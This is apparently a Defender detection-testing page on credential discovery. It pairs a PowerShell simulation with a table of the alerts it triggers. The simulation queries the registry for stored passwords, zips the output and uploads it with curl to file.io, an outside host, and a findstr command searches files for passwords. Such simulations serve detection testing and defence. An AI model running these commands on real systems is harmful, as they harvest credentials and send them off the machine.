# Password Detection

Attackers will query the Registry and local file system to find credentials and passwords saved by programs, services, user-created credential files, shared credential stores, configuration files with system or service passwords, or source code and binaries with embedded credentialsusers which may be used for automatic logons, enabling attackers to gain unauthorized access. Attackers then leverage the discovered password information to launch further attacks, such as unauthorized access, privilege escalation, or lateral movement within the network.

## Simulation

Search the local registry and file system to detect potential credentials that can be used elsewhere.

### Registry Search

```powershell
$uploadLocation = "http://file.io/?expires=1s"
$folderPath = $folderPath = "$env:TEMP\creds"
New-Item -Path $folderPath -ItemType Directory -ErrorAction SilentlyContinue

reg query HKCU /f password /t REG_SZ /s > "$folderPath\HKCU_Passwords.txt"
reg query HKLM /f password /t REG_SZ /s > "$folderPath\HKLM_Passwords.txt"

$zipFilePath = "$folderPath\passwords.zip"
Compress-Archive -Path $folderPath -DestinationPath $zipFilePath -Force

curl -F "file=@$zipFilePath" $uploadLocation
```

### File System Search

```powershell
findstr /s /i /m "password" *.*
```

## Cleanup

```powershell
$folderPath = $folderPath = "$env:TEMP\creds"
Remove-Item -Path $folderPath -Recurse -Force
```

## Detections

| Alert Title | Alert Description | Alert Details |
| -- | -- | -- |
| Registry queried for passwords | A registry query operation searching for passwords was performed. Attackers search through registry keys, values, and data to steal credentials. | **Category:** Credential access<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1012: Query Registry, T1552.002: Credentials in Registry<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR <br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |
| Password stealing from files | An attacker tried to look for passwords in files or sysvol (MS14-025) | **Category:** Discovery<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1201: Password Policy Discovery, T1552: Unsecured Credentials, T1552.001: Credentials In Files, T1555: Credentials from Password Stores<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected<br/> |
| Suspicious curl behavior | Suspicious curl behavior has been observed on this machine. Attackers may use curl to download malicious files onto your machine, or to copy malicious files onto other machines in your network. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** T1105: Ingress Tool Transfer<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |
| Possible content exfiltration | Data and file exfiltration was observed on this device. Attackers might be collecting sensitive data, including credentials for different services. Attackers often package the data collected to avoid detection on removal. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** T1041: Exfiltration Over C2 Channel, T1048: Exfiltration Over Alternative Protocol, T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, T1567: Exfiltration Over Web Service<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |
